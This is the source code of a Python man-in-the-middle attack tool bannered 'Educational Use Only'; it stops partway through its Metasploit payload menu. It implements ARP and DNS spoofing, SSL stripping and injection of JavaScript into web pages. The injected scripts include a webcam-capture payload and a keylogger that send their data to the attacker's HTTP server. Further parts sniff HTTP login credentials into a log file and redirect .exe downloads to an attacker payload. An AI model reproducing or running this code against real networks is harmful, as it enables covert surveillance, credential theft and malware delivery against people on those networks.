#!/usr/bin/env python3
import os
import sys
import time
import subprocess
import ctypes
import threading
import json
import base64
try:
    from netfilterqueue import NetfilterQueue
except ImportError:
    pass # Will be handled in main if on Linux
from scapy.all import ARP, Ether, srp, getmacbyip, send, get_if_hwaddr, sniff, IP, TCP, UDP, DNS, DNSQR, DNSRR, Raw, wrpcap, conf, get_if_addr, sr, ICMP, get_if_list
from scapy.layers.l2 import arping
import socket
import http.server
import socketserver
from urllib.parse import urlparse, parse_qs
import urllib.request
import random
import re
import string
import signal

# Colors for output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# Global variables for thread control
arp_spoofing_active = False
dns_spoofing_active = False
js_injection_active = False
camera_access_active = False
screen_capture_active = False
packet_capture_active = False
download_interceptor_active = False
credential_sniffer_active = False
ssl_stripping_active = False

# Variables for HTTP server
http_server_thread = None
http_server = None
attacker_ip_global = ""

def print_banner():
    banner = """
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║    ████████╗███████╗██████╗ ███╗   ███╗██╗███╗   ██╗ █████╗ ██╗     ║
    ║    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║████╗  ██║██╔══██╗██║     ║
    ║       ██║   █████╗  ██████╔╝██╔████╔██║██║██╔██╗ ██║███████║██║     ║
    ║       ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║██║╚██╗██║██╔══██║██║     ║
    ║       ██║   ███████╗██║  ██║██║ ╚═╝ ██║██║██║ ╚████║██║  ██║███████╗║
    ║       ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝║
    ║                                                              ║
    ║                  MITM Network Testing Tool                   ║
    ║                       Educational Use Only                   ║
    ║                         by Singh Probjot                     ║
    ╚══════════════════════════════════════════════════════════════╝
    """
    print(f"{Colors.CYAN}{banner}{Colors.END}")

def choose_interface():
    """Lets the user choose the network interface if multiple are available"""
    try:
        interfaces = get_if_list()
        # Filter out loopback interface on Linux/macOS
        interfaces = [iface for iface in interfaces if iface != 'lo']
        
        if not interfaces:
            return conf.iface
            
        if len(interfaces) == 1:
            return interfaces[0]
            
        print(f"\n{Colors.CYAN}[*] Available Network Interfaces:{Colors.END}")
        for i, iface in enumerate(interfaces):
            print(f"  {i}. {iface}")
            
        while True:
            try:
                choice = int(input(f"{Colors.YELLOW}[?] Select the interface to use (0-{len(interfaces)-1}): {Colors.END}"))
                if 0 <= choice < len(interfaces):
                    return interfaces[choice]
                print(f"{Colors.RED}[!] Invalid choice.{Colors.END}")
            except ValueError:
                print(f"{Colors.RED}[!] Please enter a number.{Colors.END}")
    except Exception:
        return conf.iface

def get_network_info(interface):
    """Gets current network information"""
    try:
        ip = get_if_addr(interface)
        netmask = "255.255.255.0"
        
        # Calculate the network
        network_parts = ip.split('.')
        netmask_parts = netmask.split('.')
        
        network = []
        for i in range(4):
            network_part = str(int(network_parts[i]) & int(netmask_parts[i]))
            network.append(network_part)
            
        network_prefix = '.'.join(network[:3])
        
        return ip, f"{network_prefix}.0/24"
    except:
        return None, None

def scan_network(network):
    """Scans the network for connected devices"""
    print(f"{Colors.YELLOW}[+] Scanning network {network}...{Colors.END}")
    
    try:
        # Uses arping to scan the network
        ans, unans = arping(network, timeout=2)
        devices = []
        
        for sent, received in ans:
            ip = received.psrc
            mac = received.hwsrc
            try:
                hostname = socket.gethostbyaddr(ip)[0]
            except:
                hostname = "Unknown"
            
            devices.append({
                'ip': ip,
                'mac': mac,
                'hostname': hostname
            })
        
        return devices
    except Exception as e:
        print(f"{Colors.RED}[!] Error during scan: {str(e)}{Colors.END}")
        return []

def print_devices(devices):
    """Prints the list of found devices"""
    if not devices:
        print(f"{Colors.RED}[!] No devices found{Colors.END}")
        return
    
    print(f"\n{Colors.GREEN}[*] Devices found:{Colors.END}")
    print(f"{Colors.BOLD}{'ID':<5}{'IP':<20}{'MAC':<20}{'Hostname':<30}{Colors.END}")
    print("-" * 75)
    
    for i, device in enumerate(devices):
        print(f"{i:<5}{device['ip']:<20}{device['mac']:<20}{device['hostname']:<30}")

def enable_ip_forwarding():
    """Enables IP forwarding for the MITM attack"""
    print(f"{Colors.YELLOW}[*] Enabling IP forwarding...{Colors.END}")
    if sys.platform.startswith("linux"):
        try:
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{Colors.GREEN}[+] IP forwarding enabled.{Colors.END}")
            return True
        except (subprocess.CalledProcessError, FileNotFoundError):
            print(f"{Colors.RED}[!] Unable to enable IP forwarding. Try running 'sysctl -w net.ipv4.ip_forward=1' manually.{Colors.END}")
            return False
    elif sys.platform == "win32":
        try:
            subprocess.run(["powershell", "-Command", "Set-NetIPInterface -Forwarding Enabled"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{Colors.GREEN}[+] IP forwarding enabled.{Colors.END}")
            return True
        except (subprocess.CalledProcessError, FileNotFoundError):
            print(f"{Colors.RED}[!] Failed to enable IP forwarding. Please run this script with administrator privileges.{Colors.END}")
            return False
    else:
        print(f"{Colors.RED}[!] IP forwarding not supported on {sys.platform}.{Colors.END}")
        return False

def disable_ip_forwarding():
    """Disables IP forwarding"""
    print(f"{Colors.YELLOW}[*] Disabling IP forwarding...{Colors.END}")
    if sys.platform.startswith("linux"):
        try:
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{Colors.YELLOW}[-] IP forwarding disabled.{Colors.END}")
        except (subprocess.CalledProcessError, FileNotFoundError):
            print(f"{Colors.RED}[!] Unable to disable IP forwarding.{Colors.END}")
    elif sys.platform == "win32":
        try:
            subprocess.run(["powershell", "-Command", "Set-NetIPInterface -Forwarding Disabled"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{Colors.YELLOW}[-] IP forwarding disabled.{Colors.END}")
        except (subprocess.CalledProcessError, FileNotFoundError):
            print(f"{Colors.RED}[!] Failed to disable IP forwarding.{Colors.END}")

def get_gateway_ip():
    """Gets the gateway IP"""
    try:
        return conf.route.route("0.0.0.0")[2]
    except Exception:
        return None

def guess_os(target_ip):
    """Attempts to guess the OS by analyzing the ping TTL."""
    try:
        # Sends an ICMP (Ping) packet silently
        ans, unans = sr(IP(dst=target_ip)/ICMP(), timeout=2, verbose=0)
        if ans:
            ttl = ans[0][1].ttl
            if ttl <= 64:
                return "Linux / Android / macOS / iOS (TTL <= 64)"
            elif ttl <= 128:
                return "Windows (TTL <= 128)"
            elif ttl <= 255:
                return "Network Device / Solaris (TTL <= 255)"
    except Exception:
        pass
    return "Unknown"

def arp_spoof(target_ip, gateway_ip, interface):
    """Executes ARP spoofing"""
    global arp_spoofing_active
    arp_spoofing_active = True
    
    try:
        target_mac = getmacbyip(target_ip)
        gateway_mac = getmacbyip(gateway_ip)
        
        if not target_mac:
            print(f"\n{Colors.RED}[!] Cannot get MAC of target {target_ip}. Stopping ARP spoof.{Colors.END}")
            arp_spoofing_active = False
            return
        if not gateway_mac:
            print(f"\n{Colors.RED}[!] Cannot get MAC of gateway {gateway_ip}. Stopping ARP spoof.{Colors.END}")
            arp_spoofing_active = False
            return

        packet_to_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        packet_to_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
        
        print(f"{Colors.GREEN}[+] Starting ARP spoofing attack against {target_ip}{Colors.END}")
        
        sent_packets_count = 0
        while arp_spoofing_active:
            send(packet_to_target, iface=interface, verbose=0)
            send(packet_to_gateway, iface=interface, verbose=0)
            sent_packets_count += 2
            print(f"\r{Colors.BLUE}[*] Packets Sent: {sent_packets_count}{Colors.END}", end="")
            time.sleep(2)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error during ARP spoofing: {str(e)}{Colors.END}")
    finally:
        print(f"\n{Colors.YELLOW}[-] ARP spoofing thread finished.{Colors.END}")
        arp_spoofing_active = False

def restore_arp(target_ip, source_ip, target_mac, interface):
    """Restores ARP tables"""
    try:
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=get_if_hwaddr(interface))
        send(packet, count=5, verbose=0)
    except:
        pass

def start_dns_spoofing(interface):
    """Starts DNS spoofing"""
    global dns_spoofing_active
    dns_spoofing_active = True
    
    try:
        print(f"{Colors.GREEN}[+] Setting up DNS spoofing{Colors.END}")
        
        my_ip, _ = get_network_info(interface)
        if not my_ip:
            print(f"{Colors.RED}[!] Could not get attacker IP for DNS spoofing.{Colors.END}")
            dns_spoofing_active = False
            return

        def dns_responder(packet):
            if dns_spoofing_active and packet.haslayer(DNSQR) and packet[DNS].qr == 0: # DNS Query
                queried_host = packet[DNSQR].qname.decode('utf-8')
                print(f"{Colors.BLUE}[DNS] Intercepted DNS query for: {queried_host}{Colors.END}")
                
                # Spoofed DNS response
                spoofed_packet = IP(dst=packet[IP].src, src=packet[IP].dst)/\
                                 UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
                                 DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                                     an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=my_ip))
                
                send(spoofed_packet, verbose=0, iface=interface)
                print(f"{Colors.GREEN}[DNS] Spoofed {queried_host} to {my_ip}{Colors.END}")

        print(f"{Colors.YELLOW}[+] Sniffing for DNS queries on {interface}...{Colors.END}")
        sniff(filter="udp port 53", prn=dns_responder, store=0, iface=interface, stop_filter=lambda x: not dns_spoofing_active)
        print(f"{Colors.YELLOW}[-] DNS Spoofing stopped.{Colors.END}")

    except Exception as e:
        print(f"{Colors.RED}[!] Error during DNS spoofing: {str(e)}{Colors.END}")
    finally:
        dns_spoofing_active = False

class MyHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    """Handler for HTTP requests, serves the JS payload and receives data."""
    def do_GET(self):
        if self.path == '/payload.js':
            self.send_response(200)
            self.send_header('Content-type', 'application/javascript')
            self.end_headers()
            
            js_code = f"""
            console.log("Payload executed!");
            function sendSnapshot(dataUrl) {{
                fetch('http://{attacker_ip_global}:8000/capture', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{ image: dataUrl }}),
                }})
                .then(response => console.log('Snapshot sent.'))
                .catch(error => console.error('Error sending snapshot:', error));
            }}
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {{
                navigator.mediaDevices.getUserMedia({{ video: true }})
                .then(function(stream) {{
                    var video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    video.addEventListener('loadeddata', () => {{
                        var canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        var context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        var dataUrl = canvas.toDataURL('image/jpeg');
                        sendSnapshot(dataUrl);
                        stream.getTracks().forEach(track => track.stop());
                    }});
                }}).catch(function(err) {{ console.log("An error occurred: " + err); }});
            }}
            """
            self.wfile.write(js_code.encode('utf-8'))
        elif self.path == '/screen.js':
            self.send_response(200)
            self.send_header('Content-type', 'application/javascript')
            self.end_headers()
            
            js_code = f"""
            console.log("Screen payload executed!");
            function sendScreenFrame(dataUrl) {{
                fetch('http://{attacker_ip_global}:8000/screen_capture', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{ frame: "received" }}),
                }}).catch(error => {{}});
            }}

            if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {{
                navigator.mediaDevices.getDisplayMedia({{ video: true }})
                .then(stream => {{
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    setInterval(() => {{
                        sendScreenFrame();
                        console.log("Sent screen frame signal.");
                    }}, 5000); // Sends a signal every 5 seconds
                }}).catch(err => console.error("Error getting display media:", err));
            }}
            """
            self.wfile.write(js_code.encode('utf-8'))
        elif self.path == '/replace.jpg':
            try:
                with open('replace.jpg', 'rb') as f:
                    self.send_response(200)
                    self.send_header('Content-type', 'image/jpeg')
                    self.end_headers()
                    self.wfile.write(f.read())
            except FileNotFoundError:
                self.send_error(404, "File Not Found: replace.jpg")
        elif self.path == '/keylogger.js':
            self.send_response(200)
            self.send_header('Content-type', 'application/javascript')
            self.end_headers()
            
            js_code = f"""
            console.log("Keylogger injected!");
            var keys = "";
            document.onkeypress = function(e) {{
                keys += e.key;
            }};
            window.setInterval(function() {{
                if(keys.length > 0) {{
                    fetch('http://{attacker_ip_global}:8000/keylog', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'text/plain' }},
                        body: keys
                    }}).catch(error => {{}});
                    keys = "";
                }}
            }}, 3000); // Sends captured keys every 3 seconds
            """
            self.wfile.write(js_code.encode('utf-8'))
        else:
            super().do_GET()

    def do_POST(self):
        if self.path == '/capture':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data)
            
            if 'image' in data:
                print(f"\n{Colors.GREEN}[+] Received image from target!{Colors.END}")
                try:
                    header, encoded = data['image'].split(",", 1)
                    image_data = base64.b64decode(encoded)
                    filename = f"capture_{int(time.time())}.jpg"
                    with open(filename, "wb") as f:
                        f.write(image_data)
                    print(f"{Colors.GREEN}[*] Image saved as {filename}{Colors.END}")
                except Exception as e:
                    print(f"{Colors.RED}[!] Error saving image: {e}{Colors.END}")

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
        elif self.path == '/screen_capture':
            print(f"\\n{Colors.GREEN}[+] Received screen frame signal from target!{Colors.END}")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
        elif self.path == '/keylog':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8', errors='ignore')
            
            print(f"\n{Colors.PURPLE}[KEYLOGGER] {post_data}{Colors.END}")
            with open("keylog.txt", "a", encoding="utf-8") as f:
                f.write(post_data)
                
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
        else:
            self.send_response(404)
            self.end_headers()

def start_http_server(ip, port=8000):
    """Starts the HTTP server in a separate thread."""
    global http_server, http_server_thread, attacker_ip_global
    attacker_ip_global = ip
    
    handler = MyHTTPRequestHandler
    http_server = socketserver.TCPServer((ip, port), handler)
    
    print(f"{Colors.GREEN}[+] Starting HTTP server on {ip}:{port}{Colors.END}")
    http_server_thread = threading.Thread(target=http_server.serve_forever)
    http_server_thread.daemon = True
    http_server_thread.start()

def stop_http_server():
    """Stops the HTTP server."""
    global http_server, http_server_thread
    if http_server:
        print(f"{Colors.YELLOW}[-] Stopping HTTP server...{Colors.END}")
        http_server.shutdown()
        http_server.server_close()
        http_server_thread.join()
        http_server = None
        http_server_thread = None

def html_js_injector(interface, injection_string):
    """Injects HTML/JS code into HTTP pages."""
    global js_injection_active
    js_injection_active = True
    
    def process_packet(packet):
        if packet.haslayer(TCP) and packet.haslayer(Raw) and packet[TCP].sport == 80:
            try:
                load = packet[Raw].load.decode('utf-8', errors='ignore')
                if '</body>' in load and 'text/html' in load:
                    print(f"{Colors.BLUE}[INJECT] Injecting payload into response to {packet[IP].dst}{Colors.END}")
                    modified_load = load.replace('</body>', injection_string + '</body>')
                    
                    new_packet = IP(src=packet[IP].src, dst=packet[IP].dst) / \
                                    TCP(sport=packet[TCP].sport, dport=packet[TCP].dport, seq=packet[TCP].seq, ack=packet[TCP].ack, flags=packet[TCP].flags) / \
                                    modified_load.encode('utf-8')
                    
                    del new_packet[IP].len
                    del new_packet[IP].chksum
                    del new_packet[TCP].chksum
                    
                    send(new_packet, iface=interface, verbose=0)
                else:
                    send(packet, iface=interface, verbose=0)
            except Exception:
                send(packet, iface=interface, verbose=0)
        else:
            send(packet, iface=interface, verbose=0)

    print(f"{Colors.GREEN}[+] Starting HTML/JS Injection on {interface}...{Colors.END}")
    sniff(iface=interface, filter="tcp port 80", prn=process_packet, store=0, stop_filter=lambda x: not js_injection_active)
    print(f"{Colors.YELLOW}[-] HTML/JS Injection stopped.{Colors.END}")

def packet_sniffer(interface, file_name):
    """Captures packets and saves them to a .pcap file."""
    global packet_capture_active
    packet_capture_active = True
    print(f"{Colors.GREEN}[+] Starting packet capture on {interface}. Saving to {file_name}{Colors.END}")
    sniff(iface=interface, store=False, prn=lambda pkt: wrpcap(file_name, pkt, append=True), stop_filter=lambda x: not packet_capture_active)
    print(f"\n{Colors.YELLOW}[-] Packet capture stopped. Data saved in {file_name}{Colors.END}")

def download_interceptor(payload_name="payload.exe", target_ext=b".exe"):
    """Intercepts file downloads and replaces them with a payload."""
    global download_interceptor_active
    download_interceptor_active = True
    
    ack_list = []

    def process_packet(packet):
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
            if scapy_packet[TCP].dport == 80: # HTTP Request
                if target_ext in scapy_packet[Raw].load:
                    print(f"{Colors.GREEN}[+] Detected {target_ext.decode()} download request!{Colors.END}")
                    ack_list.append(scapy_packet[TCP].ack)
            elif scapy_packet[TCP].sport == 80: # HTTP Response
                if scapy_packet[TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[TCP].seq)
                    print(f"{Colors.PURPLE}[+] Replacing file...{Colors.END}")
                    # Modifies the packet to redirect the download to our server
                    redirect_response = (
                        "HTTP/1.1 301 Moved Permanently\n"
                        f"Location: http://{attacker_ip_global}:8000/{payload_name}\n\n"
                    )
                    scapy_packet[Raw].load = redirect_response
                    del scapy_packet[IP].len
                    del scapy_packet[IP].chksum
                    del scapy_packet[TCP].chksum
                    packet.set_payload(bytes(scapy_packet))
        packet.accept()

    queue = NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run(stop_filter=lambda: not download_interceptor_active)
    queue.unbind()

def ssl_strip_attack():
    """
    Intercepts and modifies HTTP traffic to downgrade HTTPS links.
    This is a simplified version of SSL Stripping.
    """
    global ssl_stripping_active
    ssl_stripping_active = True

    def process_packet(packet):
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP) and scapy_packet[TCP].sport == 80:
            try:
                payload = scapy_packet[Raw].load
                # Only modify HTML content
                if b"Content-Type: text/html" in payload:
                    print(f"{Colors.PURPLE}[SSLSTRIP] Downgrading links in HTML response to {scapy_packet[IP].dst}{Colors.END}")
                    # Replace https links with http
                    modified_payload = payload.replace(b"https://", b"http://")
                    
                    scapy_packet[Raw].load = modified_payload
                    
                    del scapy_packet[IP].len
                    del scapy_packet[IP].chksum
                    del scapy_packet[TCP].chksum
                    
                    packet.set_payload(bytes(scapy_packet))
            except Exception:
                pass
        packet.accept()

    print(f"{Colors.GREEN}[+] Starting SSL Stripping... (Downgrading HTTPS links in HTTP traffic){Colors.END}")
    queue = NetfilterQueue()
    queue.bind(0, process_packet)
    try:
        queue.run(stop_filter=lambda: not ssl_stripping_active)
    finally:
        queue.unbind()
        print(f"{Colors.YELLOW}[-] SSL Stripping stopped.{Colors.END}")

def credential_sniffer(interface):
    """Intercepts and prints credentials sent via HTTP POST."""
    global credential_sniffer_active
    credential_sniffer_active = True
    
    keywords = ["username", "user", "login", "password", "pass", "email"]

    def process_packet(packet):
        if not credential_sniffer_active:
            return

        if packet.haslayer(Raw) and packet.haslayer(TCP):
            if packet[TCP].dport == 80:
                try:
                    load = packet[Raw].load.decode('utf-8', errors='ignore')
                    if "POST" in load:
                        # Checks if the payload contains one of the keywords
                        if any(keyword in load.lower() for keyword in keywords):
                            print(f"\n{Colors.BOLD}{Colors.GREEN}[+] Possible credentials captured from {packet[IP].src}:{Colors.END}")
                            
                            # Opens file in append mode to save credentials
                            with open("credentials.log", "a", encoding="utf-8") as f:
                                f.write(f"--- Credentials captured from {packet[IP].src} at {time.ctime()} ---\n")
                                # Prints the relevant lines of the payload
                                lines = load.split('\n')
                                for line in lines:
                                    if any(keyword in line.lower() for keyword in keywords):
                                        print(f"{Colors.GREEN}   {line.strip()}{Colors.END}")
                                        f.write(f"{line.strip()}\n")
                                f.write("\n")
                            print("-" * 40)

                except UnicodeDecodeError:
                    pass

    print(f"{Colors.GREEN}[+] Starting credential sniffer on {interface}...{Colors.END}")
    sniff(iface=interface, filter="tcp port 80", prn=process_packet, store=0, stop_filter=lambda x: not credential_sniffer_active)
    print(f"{Colors.YELLOW}[-] Credential sniffer stopped.{Colors.END}")

def is_admin():
    """Checks if the script is run with administrator privileges."""
    if sys.platform.startswith('linux'):
        return os.geteuid() == 0
    elif sys.platform == 'win32':
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    return False

def main():
    global arp_spoofing_active, dns_spoofing_active, js_injection_active, packet_capture_active, screen_capture_active, download_interceptor_active, credential_sniffer_active, ssl_stripping_active

    if not is_admin():
        print(f"{Colors.RED}[!] This script must be run with root/administrator privileges.{Colors.END}")
        sys.exit(1)
    
    if sys.platform.startswith("linux"):
        if 'netfilterqueue' not in sys.modules:
            print(f"{Colors.RED}[!] 'netfilterqueue' library not found. Please run 'pip install netfilterqueue'.{Colors.END}")
            sys.exit(1)

    print_banner()
    
    interface = choose_interface()
    if not interface:
        print(f"{Colors.RED}[!] Could not determine any network interfaces.{Colors.END}")
        sys.exit(1)
    
    my_ip, network = get_network_info(interface)
    if not my_ip or not network:
        print(f"{Colors.RED}[!] Could not get network information for {interface}.{Colors.END}")
        sys.exit(1)
        
    print(f"{Colors.CYAN}[*] Running on interface: {interface}{Colors.END}")
    print(f"{Colors.CYAN}[*] Attacker IP: {my_ip}{Colors.END}")
    print(f"{Colors.CYAN}[*] Network: {network}{Colors.END}")

    devices = scan_network(network)
    print_devices(devices)
    
    if not devices:
        sys.exit(1)

    try:
        target_id = int(input(f"\n{Colors.YELLOW}[?] Enter target ID: {Colors.END}"))
        target_ip = devices[target_id]['ip']
        target_mac = devices[target_id]['mac']
        target_hostname = devices[target_id]['hostname']
    except (ValueError, IndexError):
        print(f"{Colors.RED}[!] Invalid target ID.{Colors.END}")
        sys.exit(1)
        
    gateway_ip = get_gateway_ip()
    if not gateway_ip:
        print(f"{Colors.RED}[!] Could not find gateway IP.{Colors.END}")
        sys.exit(1)
        
    print(f"{Colors.CYAN}[*] Target: {target_ip}{Colors.END}")
    print(f"{Colors.CYAN}[*] Gateway: {gateway_ip}{Colors.END}")

    print(f"{Colors.YELLOW}[*] Fingerprinting OS for {target_ip}...{Colors.END}")
    guessed_os = guess_os(target_ip)
    print(f"{Colors.GREEN}[+] Guessed OS: {guessed_os}{Colors.END}")

    print(f"{Colors.YELLOW}[*] Retrieving MAC Vendor info...{Colors.END}")
    try:
        req = urllib.request.Request(f"https://api.macvendors.com/{target_mac}", headers={'User-Agent': 'Mozilla/5.0'})
        target_vendor = urllib.request.urlopen(req, timeout=2).read().decode('utf-8')
    except Exception:
        target_vendor = "Unknown Vendor"
    print(f"{Colors.GREEN}[+] Vendor: {target_vendor}{Colors.END}")

    if not enable_ip_forwarding():
        sys.exit(1)

    def cleanup(sig, frame):
        print(f"\n{Colors.RED}[!] Ctrl+C detected. Cleaning up...{Colors.END}")
        global arp_spoofing_active, dns_spoofing_active, js_injection_active, packet_capture_active, screen_capture_active, download_interceptor_active, credential_sniffer_active, ssl_stripping_active
        arp_spoofing_active = False
        dns_spoofing_active = False
        js_injection_active = False
        packet_capture_active = False
        screen_capture_active = False
        download_interceptor_active = False
        credential_sniffer_active = False
        ssl_stripping_active = False

        time.sleep(2)
        
        print(f"{Colors.YELLOW}[-] Restoring ARP tables...{Colors.END}")
        target_mac = getmacbyip(target_ip)
        gateway_mac = getmacbyip(gateway_ip)
        if target_mac: restore_arp(target_ip, gateway_ip, target_mac, interface)
        if gateway_mac: restore_arp(gateway_ip, target_ip, gateway_mac, interface)

        if sys.platform.startswith("linux"):
            subprocess.run(["iptables", "--flush"], check=True)
            
        disable_ip_forwarding()
        stop_http_server()
        
        print(f"{Colors.GREEN}[+] Cleanup complete. Exiting.{Colors.END}")
        sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)

    try:
        while True:
            # Clears the screen for a cleaner interface
            print("\033c", end="")
            print(f"{Colors.BOLD}{Colors.CYAN}🎯 TARGET INFO:{Colors.END}")
            print(f"   IP:       {Colors.WHITE}{target_ip}{Colors.END}")
            print(f"   MAC:      {Colors.WHITE}{target_mac} ({target_vendor}){Colors.END}")
            print(f"   Hostname: {Colors.WHITE}{target_hostname}{Colors.END}")
            print(f"   OS/Type:  {Colors.WHITE}{guessed_os}{Colors.END}")
            print("═"*50)
            print("\n" + "═"*20 + " ATTACKS " + "═"*19)
            print(f"1. {'Stop' if arp_spoofing_active else 'Start'} ARP Spoofing")
            print(f"2. {'Stop' if dns_spoofing_active else 'Start'} DNS Spoofing")
            print(f"3. {'Stop' if js_injection_active else 'Start'} HTML/JS Injection")
            print(f"4. {'Stop' if packet_capture_active else 'Start'} Packet Capture")
            print(f"5. {'Stop' if screen_capture_active else 'Start'} Live Screen Preview")
            print(f"6. {'Stop' if credential_sniffer_active else 'Start'} Credential Sniffer (HTTP)")
            print(f"7. {'Stop' if download_interceptor_active else 'Start'} Payload Injection (Metasploit)")
            print(f"8. {'Stop' if ssl_stripping_active else 'Start'} SSL Stripping (Downgrade HTTPS)")
            print("9. Exit")
            print("═"*46)
            
            choice = input(f"{Colors.YELLOW}[?] Choose an option: {Colors.END}")

            if choice == '1':
                if not arp_spoofing_active:
                    t = threading.Thread(target=arp_spoof, args=(target_ip, gateway_ip, interface), daemon=True)
                    t.start()
                else:
                    arp_spoofing_active = False
            
            elif choice == '2':
                if not dns_spoofing_active:
                    t = threading.Thread(target=start_dns_spoofing, args=(interface,), daemon=True)
                    t.start()
                else:
                    dns_spoofing_active = False

            elif choice == '3':
                if not js_injection_active:
                    print(f"\n{Colors.CYAN}--- HTML/JS Injection Configuration ---{Colors.END}")
                    print("1. Paste the code directly into the console")
                    print("2. Load the code from a local file")
                    print("3. Use the default JS payload (Webcam Access)")
                    print("4. Replace all images (Requires 'replace.jpg' in the current folder)")
                    print("5. JS Keylogger (Logs keystrokes to 'keylog.txt')")
                    inj_choice = input(f"{Colors.YELLOW}[?] Choose an option (1-5): {Colors.END}").strip()
                    
                    injection_string = ""
                    
                    if inj_choice == '1':
                        print(f"\n{Colors.YELLOW}[*] Paste your HTML/JS code below.{Colors.END}")
                        print(f"{Colors.YELLOW}[*] (Press Ctrl+D on Linux or Ctrl+Z followed by Enter on Windows on an empty line to confirm){Colors.END}")
                        custom_code = sys.stdin.read()
                        injection_string = custom_code.strip()
                        if not injection_string:
                            print(f"{Colors.RED}[!] No code entered. Canceling.{Colors.END}")
                            continue
                            
                    elif inj_choice == '2':
                        file_path = input(f"{Colors.YELLOW}[?] File name or path (leave blank for 'payload.html'): {Colors.END}").strip()
                        if not file_path:
                            file_path = "payload.html"
                        try:
                            with open(file_path, 'r', encoding='utf-8') as f:
                                injection_string = f.read()
                            print(f"{Colors.GREEN}[+] Read file '{file_path}' ({len(injection_string)} bytes).{Colors.END}")
                        except Exception as e:
                            print(f"{Colors.RED}[!] Error reading file: {e}{Colors.END}")
                            continue
                            
                    elif inj_choice == '3':
                        if not http_server: start_http_server(my_ip)
                        js_payload_url = f"http://{my_ip}:8000/payload.js"
                        injection_string = f'<script src="{js_payload_url}"></script>'
                        
                    elif inj_choice == '4':
                        print(f"{Colors.YELLOW}[*] IMPORTANT: Make sure you have a file named 'replace.jpg' in the current directory!{Colors.END}")
                        if not http_server: start_http_server(my_ip)
                        img_url = f"http://{my_ip}:8000/replace.jpg"
                        js_code = f"window.onload = function() {{ var imgs = document.getElementsByTagName('img'); for (var i=0; i<imgs.length; i++) {{ imgs[i].src = '{img_url}'; }} }};"
                        injection_string = f'<script>{js_code}</script>'
                        
                    elif inj_choice == '5':
                        if not http_server: start_http_server(my_ip)
                        js_payload_url = f"http://{my_ip}:8000/keylogger.js"
                        injection_string = f'<script src="{js_payload_url}"></script>'
                        
                    else:
                        print(f"{Colors.RED}[!] Invalid choice.{Colors.END}")
                        continue

                    t = threading.Thread(target=html_js_injector, args=(interface, injection_string), daemon=True)
                    t.start()
                else:
                    js_injection_active = False
                    stop_http_server()

            elif choice == '4':
                if not packet_capture_active:
                    file_name = f"capture_{int(time.time())}.pcap"
                    t = threading.Thread(target=packet_sniffer, args=(interface, file_name), daemon=True)
                    t.start()
                else:
                    packet_capture_active = False
            
            elif choice == '5':
                if not screen_capture_active:
                    if not http_server: start_http_server(my_ip)
                    screen_payload_url = f"http://{my_ip}:8000/screen.js"
                    injection_string = f'<script src="{screen_payload_url}"></script>'
                    t = threading.Thread(target=html_js_injector, args=(interface, injection_string), daemon=True)
                    t.start()
                    screen_capture_active = True # Usa la stessa flag di js_injection per semplicità
                else:
                    js_injection_active = False # Ferma l'injector
                    screen_capture_active = False
                    stop_http_server()

            elif choice == '6':
                if not credential_sniffer_active:
                    t = threading.Thread(target=credential_sniffer, args=(interface,), daemon=True)
                    t.start()
                else:
                    credential_sniffer_active = False


            elif choice == '7':
                if sys.platform.startswith("linux"):
                    if ssl_stripping_active:
                        print(f"{Colors.RED}[!] Cannot run Payload Injection while SSL Stripping is active (both use the same queue).{Colors.END}")
                        time.sleep(2)
                        continue

                    if not download_interceptor_active:
                        print(f"\n{Colors.CYAN}--- Metasploit Payload Configuration ---{Colors.END}")
                        
